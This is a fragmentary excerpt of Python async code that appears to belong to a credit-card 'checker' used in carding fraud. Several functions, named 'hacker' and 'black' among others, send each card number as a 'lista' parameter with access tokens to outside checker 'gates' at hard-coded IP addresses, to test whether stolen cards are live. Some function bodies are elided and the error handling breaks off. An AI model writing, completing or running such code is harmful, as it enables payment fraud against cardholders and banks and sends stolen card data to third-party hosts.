...
async def companychk02(card: str, gate="gate02") -> Tuple[Optional[bool], str]:
    gt = f"companychk02_{gate}"
...
async def companychk03(card: str, gate="gate03") -> Tuple[Optional[bool], str]:
    gt = f"companychk03_{gate}"
...
async def hacker(card: str) -> Tuple[Optional[bool], str]:
    gate = "hacker"
    print(f"[GATE_{gate}][{card}] Checking cc...")
    token = "checker"
    try:
        rt = await hc.get(
            f"https://191.252.111.232:7011/cc/checker?cc=",
            params=dict(token=token, lista=card),
        )
        rj = rt.text
    except:
...
async def black(card: str) -> Tuple[Optional[bool], str]:
    gate = "Devney"
    print(f"[GATE_{gate}][{card}] Checking cc...")
    token = "api_store_666"
    try:
        rt = await hc.get(
            f"http://190.115.196.10/Devney/api.php?lista=",
            params=dict(token=token, lista=card),
        )
        rj = rt.text
    except:
